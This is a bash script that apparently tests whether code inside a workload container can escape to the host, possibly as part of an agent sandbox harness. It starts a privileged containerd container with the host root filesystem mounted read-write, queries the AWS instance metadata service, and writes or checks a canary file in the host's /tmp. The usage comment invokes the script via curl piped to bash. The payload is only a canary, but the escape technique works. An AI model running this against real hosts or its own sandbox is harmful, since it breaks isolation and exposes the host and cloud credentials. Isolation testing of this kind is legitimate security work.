#!/bin/bash
# Container escape persistence check — write or check a canary file on the host.
# Runs INSIDE the workload container (not the escape container).
#
# Usage from the harness shell tool:
#   curl -sL <url> | MODE=write CANARY_TAG=<tag> bash   # Invocation A
#   curl -sL <url> | MODE=check CANARY_TAG=<tag> bash   # Invocation B (later)
#
# Env:
#   MODE — "write" or "check". Required.
#   CANARY_TAG — unique tag for this test run. Required.
#
set +e

if [ -z "$MODE" ] || [ -z "$CANARY_TAG" ]; then
  echo "FAIL: MODE and CANARY_TAG must be set"
  exit 1
fi

IMG=$(/usr/local/bin/ctr -n default images list 2>/dev/null | awk 'NR>1 {print $1}' | head -1)
if [ -z "$IMG" ]; then
  echo "FAIL: no containerd image found"
  exit 1
fi

CONTAINER_NAME="persist-${MODE}-$(head -c 4 /dev/urandom | xxd -p)"

/usr/local/bin/ctr tasks kill "$CONTAINER_NAME" 2>/dev/null
/usr/local/bin/ctr tasks delete "$CONTAINER_NAME" 2>/dev/null
/usr/local/bin/ctr containers rm "$CONTAINER_NAME" 2>/dev/null

if [ "$MODE" = "write" ]; then
  INNER='set +e
T=$(curl -s --max-time 3 http://169.254.169.254/latest/api/token -X PUT -H X-aws-ec2-metadata-token-ttl-seconds:60)
echo INSTANCE_ID=$(curl -s --max-time 3 -H X-aws-ec2-metadata-token:$T http://169.254.169.254/latest/meta-data/instance-id)
echo UPTIME=$(cat /host/proc/uptime 2>/dev/null | cut -d" " -f1)
echo '"$CANARY_TAG"' > /host/tmp/canary-'"$CANARY_TAG"'.txt
ls /host/tmp/canary-'"$CANARY_TAG"'.txt && echo CANARY_WRITTEN || echo CANARY_FAIL
'
  MOUNT_OPT="rbind:rw"
else
  INNER='set +e
T=$(curl -s --max-time 3 http://169.254.169.254/latest/api/token -X PUT -H X-aws-ec2-metadata-token-ttl-seconds:60)
echo INSTANCE_ID=$(curl -s --max-time 3 -H X-aws-ec2-metadata-token:$T http://169.254.169.254/latest/meta-data/instance-id)
echo UPTIME=$(cat /host/proc/uptime 2>/dev/null | cut -d" " -f1)
if [ -f /host/tmp/canary-'"$CANARY_TAG"'.txt ]; then
  echo CANARY_FOUND
  cat /host/tmp/canary-'"$CANARY_TAG"'.txt
else
  echo CANARY_GONE
fi
'
  MOUNT_OPT="rbind:ro"
fi

/usr/local/bin/ctr run --rm --privileged --net-host \
  --env "CANARY_TAG=$CANARY_TAG" \
  --mount=type=bind,src=/,dst=/host,options="$MOUNT_OPT" \
  "$IMG" "$CONTAINER_NAME" \
  /bin/bash -c "$INNER" 2>&1

echo "DONE_PERSISTENCE_${MODE}"
